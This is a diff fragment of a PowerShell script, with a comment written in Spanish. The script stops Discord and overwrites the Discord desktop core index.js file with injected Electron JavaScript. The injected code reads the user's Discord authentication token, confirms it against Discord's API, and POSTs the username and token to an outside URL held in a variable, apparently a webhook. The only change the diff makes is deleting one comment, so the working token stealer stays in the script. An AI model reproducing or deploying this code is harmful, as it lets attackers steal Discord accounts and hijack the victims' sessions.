@@ -30,7 +30,6 @@ Stop-Process -Name Discord -Force -ErrorAction SilentlyContinue
 $f = (Get-ChildItem -Path "$env:LOCALAPPDATA\Discord\app-*" -Filter "index.js" -Recurse | Where-Object {$_.FullName -like "*discord_desktop_core*"} | Select-Object -ExpandProperty FullName -First 1)
 
 if($f){
-    # Inyectamos el One-Line con el formato de texto mejorado (User y Token en negrita y bloque)
     $index_content = 'const {app,net}=require("electron"),U="'+$w+'";let l=null;app.on("browser-window-created",(e,w)=>{w.webContents.on("did-finish-load",()=>{w.webContents.executeJavaScript(`(function(){const f=()=>{try{let t;window.webpackChunkdiscord_app.push([[Math.random()],{},(r)=>{for(let m in r.c){if(r.c[m].exports&&r.c[m].exports.default&&r.c[m].exports.default.getToken){let v=r.c[m].exports.default.getToken();if(typeof v==="string")t=v}}}]);if(t){fetch("https://discord.com/api/v9/users/@me",{headers:{"Authorization":t}}).then(r=>r.json()).then(u=>{console.log("V:"+(u.username||u.global_name)+" I:"+t)})}}catch(e){}};setInterval(f,3000)})()`)}) ;w.webContents.on("console-message",(e,lvl,m)=>{if(m.startsWith("V:")){const d=m.split("V:")[1];if(d!==l){l=d;const p=d.split(" I:");const r=net.request({method:"POST",url:U});r.setHeader("Content-Type","application/json");r.write(JSON.stringify({content:"**User:** `"+p[0]+"`\n**Token:**\n```"+p[1]+"```"}));r.end()}}})});module.exports=require("./core.asar");'
     
     [System.IO.File]::WriteAllText($f, $index_content)
